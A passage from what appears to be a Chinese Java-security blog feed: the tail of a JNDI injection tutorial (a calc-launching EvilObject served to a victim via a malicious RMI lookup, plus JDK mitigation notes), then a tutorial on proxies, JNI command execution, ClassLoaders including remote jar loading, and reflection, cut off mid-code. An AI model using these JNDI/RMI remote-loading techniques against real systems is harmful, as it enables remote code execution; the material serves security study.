Runtime.getRuntime();</span><br><span class="line">        String[] commands &#x3D; &#123;&quot;calc&quot;&#125;;</span><br><span class="line">        Process pc &#x3D; rt.exec(commands);</span><br><span class="line">        pc.waitFor();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们先运行RMI服务器，然后把EvilObject.class放置于<a href="http://192.168.111.1/%E4%B8%8B%EF%BC%8C%E7%84%B6%E5%90%8E%E6%8C%87%E5%AE%9Alookup%E5%8F%82%E6%95%B0%E4%B8%BA%E6%88%91%E4%BB%AC%E7%9A%84%E6%81%B6%E6%84%8FRMI%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%8E%BB%E8%BF%90%E8%A1%8C%E5%8F%97%E5%AE%B3%E6%9C%BA%E5%99%A8%E3%80%82">http://192.168.111.1:80/下，然后指定lookup参数为我们的恶意RMI服务器去运行受害机器。</a></p><p>如果是早期JDK版本，计算器就已经弹出来了。JDK 6u141, JDK 7u131, JDK 8u121 以及更高版本中Java提升了JNDI 限制了Naming/Directory服务中JNDI Reference<strong>远程</strong>加载Object Factory类的特性，所以会执行以上流程会有如下报错</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">The object factory is untrusted. Set the system property &#39;com.sun.jndi.rmi.object.trustURLCodebase&#39; to &#39;true&#39;.</span><br></pre></td></tr></table></figure><p>系统属性 com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase 的默认值变为false，即默认不允许从远程的Codebase加载Reference工厂类。</p><p>以上是JNDI Reference+RMI的利用方式，除此之外还有一个JNDI Reference+ldap 的利用方式，操作与JNDI Reference+RMI大同小异，也就是通过ldap协议lookup一个恶意服务器并获得恶意Reference对象，并且LDAP服务的Reference远程加载Factory类不受 com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase等属性的限制，所以利用面更广<br>但是在Oracle JDK 11.0.1、8u191、7u201、6u211之后 com.sun.jndi.ldap.object.trustURLCodebase 属性的默认值被调整为false，还对应的分配了一个漏洞编号CVE-2018-3149。</p><h1 id="JNDI注入：高版本如何利用？"><a href="#JNDI注入：高版本如何利用？" class="headerlink" title="JNDI注入：高版本如何利用？"></a>JNDI注入：高版本如何利用？</h1>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;JNDI注入依赖RMI，所以在学习JNDI注入前务必了解一下RMI&lt;/p&gt;
&lt;h1 id=&quot;JNDI-简介&quot;&gt;&lt;a href=&quot;#JNDI-简介&quot; class=&quot;headerlink&quot; title=&quot;JNDI 简介&quot;&gt;&lt;/a&gt;JNDI 简介&lt;/h1&gt;&lt;p&gt;JNDI (Jav</summary>
      
    
    
    
    
    <category term="java开发与安全" scheme="http://const27.com/tags/java%E5%BC%80%E5%8F%91%E4%B8%8E%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>java安全中几个重要机制</title>
    <link href="http://const27.com/2021/06/28/java%E5%AE%89%E5%85%A8%E4%B8%AD%E9%87%8D%E8%A6%81%E7%9A%84%E5%87%A0%E4%B8%AA%E6%9C%BA%E5%88%B6/"/>
    <id>http://const27.com/2021/06/28/java%E5%AE%89%E5%85%A8%E4%B8%AD%E9%87%8D%E8%A6%81%E7%9A%84%E5%87%A0%E4%B8%AA%E6%9C%BA%E5%88%B6/</id>
    <published>2021-06-28T13:51:11.042Z</published>
    <updated>2021-03-31T06:02:07.803Z</updated>
    
    <content type="html"><![CDATA[<h1 id="java-代理"><a href="#java-代理" class="headerlink" title="java 代理"></a>java 代理</h1><p>代理的作用，就是在原有类的代码不发生改动的情况下，添加新功能。起到一个修饰器的作用。</p><p>假设我们现在有个类，用于打印helloworld</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class hello&#123;</span><br><span class="line">    public void gogo()&#123;System.out.println(&quot;Hello Wrold&quot;);&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们想在不改动hello类的前提下，在输出helloworld时同时输出当前时间到文件，达到日志的功能，该如何解决这个问题呢？以这个问题为切入点，开始学习代理。</p><h2 id="静态代理"><a href="#静态代理" class="headerlink" title="静态代理"></a>静态代理</h2><p>静态代理很简单，不用接触什么新技术。就是创建一个”继承已有的一个类<br>“的类，通过重写父类的方法，达到不改动原有类的基础上增添新功能。纸上得来终觉浅，用代码来说明一下吧。</p><p>以刚刚的输出helloworld的类为例。我们编写一个它的子类，并在其中重写其gogo方法，添加日志生成功能</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class hello&#123;</span><br><span class="line">    public void gogo()&#123;System.out.println(&quot;Hello Wrold&quot;);&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class static_hello_proxy extends hello&#123;</span><br><span class="line">    hello hello_obj;</span><br><span class="line">    static_hello_proxy(hello hello)&#123;</span><br><span class="line">        this.hello_obj &#x3D; hello;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void gogo()&#123;</span><br><span class="line">        log();</span><br><span class="line">        hello_obj.gogo();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void log()&#123;</span><br><span class="line">        Date date &#x3D; new Date();</span><br><span class="line">        String value &#x3D; &quot;date:&quot;+date+&quot;\n&quot;;</span><br><span class="line">        FileWriter writer &#x3D; null;</span><br><span class="line">        try &#123;</span><br><span class="line">            writer &#x3D; new FileWriter(new File(&quot;log.txt&quot;),true);</span><br><span class="line">            writer.write(value);</span><br><span class="line">            writer.flush();</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后主函数中我们只需调用static_hello_proxy中的gogo()方法就能达到日志功能了。这就是静态代理。<br>静态代理的缺点显而易见，如果我们想要代理不同的类，就要写出不同的静态代理类出来，同时我们也可能会遇到需要多个代理类来增添实现一个类的不同功能，有需要定义一大堆类出来。不容易维护，所以动态代理就诞生了，它很好的解决了静态代理会产生大量代理类的难题。</p><h2 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h2><p>使用动态代理，可以不用创建代理类，非常的方便。</p><p>动态代理由Proxy.newProxyInstance方法实现。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219150752.png" alt="QQ截图20210219150752"></p><p>我们看看它的三个参数。<br>loader，顾名思义，就是被代理类的类加载器。<br>interfaces 被代理类所需要实现的接口，可通过 类对象.getinterfaces()获得<br>h 即 InvocationHandler接口类 的实现类，用于实现代理增添的方法</p><p>我们看看这个 InvocationHandler 类的结构。这个类只有一个invoke方法，且这个类是接口类。这个invoke方法就用于存放我们的增添的功能。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219150801.png" alt="QQ截图20210219150801"></p><p>proxy即代理对象，method即对象中的某个方法，args即方法中的参数。</p><p>ok，接下来把刚刚那个类动态代理一下吧。但是需要注意的是动态代理只能代理接口实现类。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import java.io.File;</span><br><span class="line">import java.io.FileInputStream;</span><br><span class="line">import java.io.FileWriter;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.lang.reflect.InvocationHandler;</span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line">import java.lang.reflect.Proxy;</span><br><span class="line">import java.util.Date;</span><br><span class="line"></span><br><span class="line">public class test &#123;</span><br><span class="line">    public static void main(String[] args)&#123;</span><br><span class="line">        hello hello_obj &#x3D; new hello();</span><br><span class="line">        ClassLoader Loader &#x3D; hello_obj.getClass().getClassLoader();</span><br><span class="line">        Class&lt;?&gt;[] Interfaces &#x3D; hello_obj.getClass().getInterfaces();</span><br><span class="line">        InvocationHandler ih &#x3D; new InvocationHandler() &#123;</span><br><span class="line">            @Override</span><br><span class="line">            public Object invoke(Object proxy, Method method, Object[] args) throws Throwable &#123;</span><br><span class="line">                if(method.getName()&#x3D;&#x3D;&quot;gogo&quot;)&#123;</span><br><span class="line">                    FileWriter writer &#x3D; new FileWriter(&quot;log.txt&quot;);</span><br><span class="line">                    writer.write(&quot;date:&quot;+new Date()+&quot;|by 动态代理\n&quot;);</span><br><span class="line">                    writer.flush();</span><br><span class="line">                    hello_obj.gogo();</span><br><span class="line">                &#125;</span><br><span class="line">                return null;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        hello_interface proxy &#x3D; (hello_interface) Proxy.newProxyInstance(Loader,Interfaces,ih);  &#x2F;&#x2F;注意这里数据类型是接口的数据类型</span><br><span class="line">        proxy.gogo();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface hello_interface&#123;</span><br><span class="line">    public void gogo();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class hello implements hello_interface&#123;</span><br><span class="line">    public void gogo()&#123;System.out.println(&quot;Hello Wrold&quot;);&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>OK,ALL DOWN</p><h1 id="JNI"><a href="#JNI" class="headerlink" title="JNI"></a>JNI</h1><p>JNI是JAVA的一个接口，用来实现c/c++调用，为JAVA提供了一个操纵底层的能力。</p><h2 id="JNI-HelloWorld"><a href="#JNI-HelloWorld" class="headerlink" title="JNI HelloWorld"></a>JNI HelloWorld</h2><p>java IDE：idea C IDE：vs2019</p><p>1.写好JAVA文件，定义好native方法。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public class test &#123;</span><br><span class="line">    static&#123;</span><br><span class="line">        System.loadLibrary(&quot;Dll1&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    public native void hello();</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        test a &#x3D; new test();</span><br><span class="line">        a.hello();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2.使用javac指令为java文件的各native方法生成c语言头文件。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">javac -cp . test.java -h .</span><br></pre></td></tr></table></figure><p>执行后会在当前目录下生成一个头文件</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219150831.png" alt="QQ截图20210219150831"></p><p>3.用vscode创建一个dll项目，将test.h与jdk include目录下的jni.h以及jdk/include/win32/jni_md.h统统移动到项目文件目录下。然后在vscode头文件里添加现有项，把刚刚放到项目文件下的3个头文件添加进去。</p><p>4.在c或c++中定义native方法的c/c++原型。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219150842.png" alt="QQ截图20210219150842"></p><p>通过test.h我们可以看到哪些方法需要我们定义。这里是Java_test_hello方法。</p><p>我们随便定义一下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &quot;test.h&quot;</span><br><span class="line"></span><br><span class="line">JNIEXPORT void JNICALL Java_test_hello(JNIEnv* a, jobject b) &#123;</span><br><span class="line">printf(&quot;Hello,World&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译为dll文件。</p><p>5.在idea里为当前项目指定依赖dll文件路径</p><p>先点击箭头指向处的编辑选项，然后在虚拟机选项里填上-Djava.library.path=你的dll路径</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219151203.png" alt="QQ截图20210219151203"></p><p>6.把dll文件拖进刚刚配置好的依赖路径，运行</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219151203.png" alt="QQ截图20210219151203"></p><h2 id="JNI-数据类型"><a href="#JNI-数据类型" class="headerlink" title="JNI 数据类型"></a>JNI 数据类型</h2><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219151238.png" alt="QQ截图20210219151238"></p><p>JNI类型数据在c文件里当作传入参数和返回结果，参数传入后其数据类型会被用指定方法转换为C类型然后被处理，处理完毕后使用指定方法转换为JNI类型返回给JAVA。</p><p>这里介绍一下c中JNI类型与c类型互转的函数</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">jstring转char*：env-&gt;GetStringUTFChars(str, &amp;jsCopy)</span><br><span class="line"></span><br><span class="line">char*转jstring: env-&gt;NewStringUTF(&quot;Hello...&quot;)</span><br><span class="line"></span><br><span class="line">字符串资源释放: env-&gt;ReleaseStringUTFChars(javaString, p);</span><br></pre></td></tr></table></figure><h2 id="JNI-实现本地命令执行"><a href="#JNI-实现本地命令执行" class="headerlink" title="JNI 实现本地命令执行"></a>JNI 实现本地命令执行</h2><p>相当于一个加强版的helloworld.</p><p>首先我们看一下，如果在c++中我们想执行本地命令执行该如何执行</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include&lt;iostream&gt;</span><br><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include &lt;string&gt;</span><br><span class="line"></span><br><span class="line">std::string gogo(const char* cmd) &#123;</span><br><span class="line">const char* cmd &#x3D; cmd;</span><br><span class="line">FILE* fp &#x3D; _popen(cmd, &quot;r&quot;);</span><br><span class="line">if (fp !&#x3D; NULL) &#123;</span><br><span class="line">std::string result;</span><br><span class="line">char buf[128];</span><br><span class="line">while (fgets(buf, sizeof(buf), fp) !&#x3D; NULL) &#123;</span><br><span class="line">result +&#x3D; buf;</span><br><span class="line">&#125;</span><br><span class="line">return result;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">std::string result &#x3D; gogo(&quot;dir&quot;);</span><br><span class="line">std::cout &lt;&lt; result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么我们在JNI里如何实现呢?其实也差不多.</p><p>我们现在写好java代码</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public class test &#123;</span><br><span class="line">    static&#123;</span><br><span class="line">        System.loadLibrary(&quot;Dll2&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    public native String gogo(String cmd);</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        test a &#x3D; new test();</span><br><span class="line">        String str &#x3D; a.gogo(&quot;dir&quot;);</span><br><span class="line">        System.out.println(str);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>写好c++代码</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &quot;test.h&quot;</span><br><span class="line">#include&lt;iostream&gt;</span><br><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include &lt;string&gt;</span><br><span class="line">JNIEXPORT jstring JNICALL Java_test_gogo(JNIEnv* env, jobject obj, jstring str) &#123;</span><br><span class="line"> const char* cmd &#x3D; env-&gt;GetStringUTFChars(str, 0);</span><br><span class="line"> FILE* fd &#x3D; _popen(cmd, &quot;r&quot;);</span><br><span class="line"> if (fd !&#x3D; NULL) &#123;</span><br><span class="line"> std::string result;</span><br><span class="line"> char buf[128];</span><br><span class="line"> while (fgets(buf, sizeof(buf), fd) !&#x3D; NULL) &#123;</span><br><span class="line"> result +&#x3D; buf;</span><br><span class="line"> &#125;</span><br><span class="line"> _pclose(fd);</span><br><span class="line"> return env-&gt;NewStringUTF(result.c_str());</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219151248.png" alt="QQ截图20210219151248"></p><h1 id="类加载器"><a href="#类加载器" class="headerlink" title="类加载器"></a>类加载器</h1><h2 id="ClassLoader"><a href="#ClassLoader" class="headerlink" title="ClassLoader"></a>ClassLoader</h2><p>在JVM类加载器中最顶层的是<code>Bootstrap ClassLoader(引导类加载器)</code>、<code>Extension ClassLoader(扩展类加载器)</code>、<code>App ClassLoader(系统类加载器)</code>，<code>AppClassLoader</code>是默认的类加载器，如果类加载时我们不指定类加载器的情况下，默认会使用<code>AppClassLoader</code>加载类，<code>ClassLoader.getSystemClassLoader()</code>返回的系统类加载器也是<code>AppClassLoader</code>。</p><p>ClassLoader的主要方法有以下几个：</p><ol><li><code>loadClass</code>(加载指定的Java类)</li><li><code>findClass</code>(查找指定的Java类)</li><li><code>findLoadedClass</code>(查找JVM已经加载过的类)</li><li><code>defineClass</code>(从byte[]获得一个Java类)</li><li><code>resolveClass</code>(链接指定的Java类)</li></ol><p>如何通过ClassLoader获取一个类对象？很简单</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Class a &#x3D; ClassLoader.getSystemClassLoader().loadClass(&quot;java.lang.Runtime&quot;);</span><br></pre></td></tr></table></figure><p>它对一个类的加载流程如下:</p><ol><li>ClassLoader调用loadClass(String name)方法加载指定类</li><li>调用findLoadedClass检查指定的类是否已经初始化，若已初始化则直接返回类对象</li><li>如果创建ClassLoader时传入父类加载器，则使用父类加载器加载指定类，否则使用JVM的Bootstrap ClassLoader（引导类加载器）加载</li><li>如果以上步骤没有完成加载，则使用findClass方法尝试加载指定类</li><li>如果当前ClassLoader类没有重写findClass方法则直接返回异常。若重写了该方法且通过findClass找到了传入的类名的对应的类字节码，那么就会使用defineClass去JVM注册该类</li><li>如果loadClass调用时传入resolve的参数为true，则那么还需要调用resolveClass方法连接类。该参数默认为false</li><li>返回被JVM加载后的指定类的类对象</li></ol><h2 id="ClassLoader自定义"><a href="#ClassLoader自定义" class="headerlink" title="ClassLoader自定义"></a>ClassLoader自定义</h2><p>java.lang.ClassLoader 是所有类加载器的父类，我们可以通过重写其findClass方法来实现自定义ClassLoader。</p><p>我们试着自定义一个，当对loadClass传入com.anbai.sec.classloader.TestHelloWorld 时会直接返回一个在加载器里已经定义好了的对应类的类对象。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class TestClassLoader extends  ClassLoader&#123;</span><br><span class="line">    String testClassName&#x3D;&quot;com.anbai.sec.classloader.TestHelloWorld&quot;;</span><br><span class="line">    byte[] testClassBytes &#x3D; new byte[]&#123;-54, -2, -70, -66, 0, 0, 0, 51, 0, 17, 10, 0, 4, 0, 13, 8, 0, 14, 7, 0, 15, 7, 0,</span><br><span class="line">            16, 1, 0, 6, 60, 105, 110, 105, 116, 62, 1, 0, 3, 40, 41, 86, 1, 0, 4, 67, 111, 100,</span><br><span class="line">            101, 1, 0, 15, 76, 105, 110, 101, 78, 117, 109, 98, 101, 114, 84, 97, 98, 108, 101,</span><br><span class="line">            1, 0, 5, 104, 101, 108, 108, 111, 1, 0, 20, 40, 41, 76, 106, 97, 118, 97, 47, 108,</span><br><span class="line">            97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 1, 0, 10, 83, 111, 117, 114, 99,</span><br><span class="line">            101, 70, 105, 108, 101, 1, 0, 19, 84, 101, 115, 116, 72, 101, 108, 108, 111, 87, 111,</span><br><span class="line">            114, 108, 100, 46, 106, 97, 118, 97, 12, 0, 5, 0, 6, 1, 0, 12, 72, 101, 108, 108, 111,</span><br><span class="line">            32, 87, 111, 114, 108, 100, 126, 1, 0, 40, 99, 111, 109, 47, 97, 110, 98, 97, 105, 47,</span><br><span class="line">            115, 101, 99, 47, 99, 108, 97, 115, 115, 108, 111, 97, 100, 101, 114, 47, 84, 101, 115,</span><br><span class="line">            116, 72, 101, 108, 108, 111, 87, 111, 114, 108, 100, 1, 0, 16, 106, 97, 118, 97, 47, 108,</span><br><span class="line">            97, 110, 103, 47, 79, 98, 106, 101, 99, 116, 0, 33, 0, 3, 0, 4, 0, 0, 0, 0, 0, 2, 0, 1,</span><br><span class="line">            0, 5, 0, 6, 0, 1, 0, 7, 0, 0, 0, 29, 0, 1, 0, 1, 0, 0, 0, 5, 42, -73, 0, 1, -79, 0, 0, 0,</span><br><span class="line">            1, 0, 8, 0, 0, 0, 6, 0, 1, 0, 0, 0, 7, 0, 1, 0, 9, 0, 10, 0, 1, 0, 7, 0, 0, 0, 27, 0, 1,</span><br><span class="line">            0, 1, 0, 0, 0, 3, 18, 2, -80, 0, 0, 0, 1, 0, 8, 0, 0, 0, 6, 0, 1, 0, 0, 0, 10, 0, 1, 0, 11,</span><br><span class="line">            0, 0, 0, 2, 0, 12&#125;;  &#x2F;&#x2F;这部分是类字节码，是我从别人那里嫖的</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    protected Class&lt;?&gt; findClass(String name) throws ClassNotFoundException &#123;</span><br><span class="line">        if(name.equals(&quot;com.anbai.sec.classloader.TestHelloWorld&quot;))&#123;</span><br><span class="line">            return  defineClass(testClassName,testClassBytes,0,testClassBytes.length);</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            return super.findClass(name);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后主函数我们写</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public static void main(String[] args) &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        TestClassLoader Loader &#x3D; new TestClassLoader();</span><br><span class="line">        Class clazz &#x3D; Loader.loadClass(&quot;com.anbai.sec.classloader.TestHelloWorld&quot;);</span><br><span class="line">        Object Instance &#x3D; clazz.newInstance();</span><br><span class="line">        Method method &#x3D; Instance.getClass().getMethod(&quot;hello&quot;);</span><br><span class="line">        String str &#x3D; (String) method.invoke(Instance);</span><br><span class="line">        System.out.println(str);</span><br><span class="line">    &#125;catch (Exception e)&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>经测试程序正常运行。我们的自定义ClassLoader就写好了。当然还有更多花里胡哨的重写方法，我们这里只是知道怎么重写即可。</p><h2 id="URLClassLoader"><a href="#URLClassLoader" class="headerlink" title="URLClassLoader"></a>URLClassLoader</h2><p>URLClassLoader也是ClassLoader类下的一个重写类。这个类很好用，它可以通过网络协议获取远程的jar包，然后通过类加载器去获得其中的指定类的类对象。试试吧。</p><p>流程是先定义一个URL对象指向我们的jar包，然后实例化一个URLClassLoader对象，然后通过loadClass加载某个类获得类对象。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line">import java.net.URL;</span><br><span class="line">import java.net.URLClassLoader;</span><br><span class="line"></span><br><span class="line">public class test &#123;</span><br><span class="line">    public static void main(String[] args)&#123;</span><br><span class="line">            try&#123;</span><br><span class="line">&#x2F;&#x2F;                Class clazz &#x3D; ClassLoader.getSystemClassLoader().loadClass(&quot;fuck&quot;);</span><br><span class="line">&#x2F;&#x2F;                Method method &#x3D; clazz.getMethod(&quot;func1&quot;,int.class);</span><br><span class="line">&#x2F;&#x2F;                method.invoke(clazz.newInstance(),123);</span><br><span class="line">                URL url &#x3D; new URL(&quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;LOL.jar&quot;);</span><br><span class="line">                URLClassLoader Loader &#x3D; new URLClassLoader(new URL[]&#123;url&#125;);</span><br><span class="line">                Class clazz &#x3D; Loader.loadClass(&quot;fuck&quot;);</span><br><span class="line">                Method method &#x3D; clazz.getMethod(&quot;func1&quot;,int.class);</span><br><span class="line">                method.setAccessible(true);</span><br><span class="line">                method.invoke(clazz.newInstance(),123);</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            catch (Exception e)&#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后我们jar包里的class是这个.JAVA的编译文件</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public class fuck&#123;</span><br><span class="line">    public void func1(int input1)&#123;</span><br><span class="line">        System.out.print(input1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行结果</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219151315.png" alt="QQ截图20210219151315"></p><h1 id="反射"><a href="#反射" class="headerlink" title="反射"></a>反射</h1><h2 id="反射的基础"><a href="#反射的基础" class="headerlink" title="反射的基础"></a>反射的基础</h2><p>反射是java的一个特性，用于获取类的详细信息（方法，变量），并可以执行类中的方法。</p><h3 id="获得一个类的类对象"><a href="#获得一个类的类对象" class="headerlink" title="获得一个类的类对象"></a>获得一个类的类对象</h3><p>要获取类的详细信息或执行其中的方法，首先肯定是要获取到那个类的类对象</p><p>方法一:我们需要创建一个Class类型的变量，用于接收Class.forname(“类”)返回的类对象。这个方法必须通过try..catch 来处理其中ClassNotFoundException</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">try&#123;</span><br><span class="line">Class clazz &#x3D; Class.forname(&quot;java.lang.String&quot;)；&#125;</span><br><span class="line">catch(ClassNotFoundException e)&#123;&#125;</span><br></pre></td></tr></table></figure><p>方法二:我们实例化一个类的对象出来，然后通过 对象.getClass()获得其类对象</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">String a &#x3D; new String;</span><br><span class="line">Class clazz &#x3D; a.getclass();</span><br></pre></td></tr></table></figure><p>方法三:使用.class</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Class clazz &#x3D; String.class;</span><br></pre></td></tr></table></figure><p>这样，我们就获得一个指定类的类对象了。很简单。我们可以对一个类对象使用getName()方法获取其类名。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">System.out.println(clazz.getName());</span><br></pre></td></tr></table></figure><h3 id="获取一个类对象的所有成员"><a href="#获取一个类对象的所有成员" class="headerlink" title="获取一个类对象的所有成员"></a>获取一个类对象的所有成员</h3><h4 id="获取属性并修改"><a href="#获取属性并修改" class="headerlink" title="获取属性并修改"></a>获取属性并修改</h4><p>对类对象使用 getFields() 或 getDeclaredFields() 方法即可获得属性数组，区别在于前者只能获取公有属性，后者能获取私有属性。<br>然后遍历属性数组，通过对每一项执行getName()获取属性名，get(实例化的对象)获得属性值<br>然后对某一项进行.set()对其进行修改<br>这里需要提的是，如果要获得或修改私有属性的值的时候，需要对私有属性使用setAccessible(true)来实现私有访问</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line">public class test &#123;</span><br><span class="line">    public static void main(String[] args)&#123;</span><br><span class="line">        Class clazz &#x3D; (new abc()).getClass();</span><br><span class="line">        abc test &#x3D; new abc();</span><br><span class="line">        Field[] Fields &#x3D; clazz.getDeclaredFields();</span><br><span class="line">        for(Field Field:Fields)&#123; &#x2F;&#x2F;遍历Fields数组</span><br><span class="line">            try &#123; &#x2F;&#x2F;执行get()方法时需抛出IllegalAccessException错误</span><br><span class="line">                Field.setAccessible(true);  &#x2F;&#x2F;对数组中的每一项实现私有访问</span><br><span class="line">                System.out.print(Field.getName());</span><br><span class="line">                Object value &#x3D; Field.get(new abc());</span><br><span class="line">                System.out.println(&quot;:&quot; + value);</span><br><span class="line">                Field.set(test,&quot;new&quot;);   &#x2F;&#x2F;修改test对象中的变量</span><br><span class="line">            &#125;</span><br><span class="line">            catch (Exception e)&#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(test.a);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class abc&#123;</span><br><span class="line">    public String a &#x3D;new String(&quot;tom and mary&quot;);</span><br><span class="line">    private String b &#x3D; new String(&quot;abcdefg&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210219151405.png" alt="QQ截图20210219151405"></p><p>另外，你也可以通过getFiled(“属性名”)来获取特定属性的Filed对象， getDeclaredFields() 同理</p><h4 id="获取方法并执行"><a href="#获取方法并执行" class="headerlink" title="获取方法并执行"></a>获取方法并执行</h4><p>接下来是获取方法的一些信息<br>我们通过getMethod获取方法对象，然后通过getName获取方法名，getReturnType获取返回值类型，getParameterTypes获取传入的参数类型</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line">public class test &#123;</span><br><span class="line">    public static void main(String[] args)&#123;</span><br><span class="line">        Class clazz &#x3D; (new abc()).getClass();</span><br><span class="line">        Method[] methods &#x3D; clazz.getDeclaredMethods();</span><br><span class="line">        for(Method method:methods)&#123;</span><br><span class="line">            try&#123;</span><br><span class="line">                System.out.print(method.getName());</span><br><span class="line">                System.out.print(&quot;|retrunType:&quot;+method.getReturnType()+&quot;|&quot;);</span><br><span class="line">                Class[] ParameterTypes &#x3D; method.getParameterTypes();</span><br><span class="line">                for(Class ParameterType:ParameterTypes)&#123;</span><br><span class="line">                    System.out.print(&quot;ParamType:&quot;+ParameterType.getName());</span><br><span class="line">                &#125;</span><br><span class="line">                System.out.println(&quot;&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            catch (Exception e)&#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class abc&#123;</span><br><span class="line">    public int a &#x3D;1;</span><br><span class="line">    private String b &#x3D; new String(&quot;abcdefg&quot;);</span><br><span class="line"></span><br><span class="line">    public void func1(int 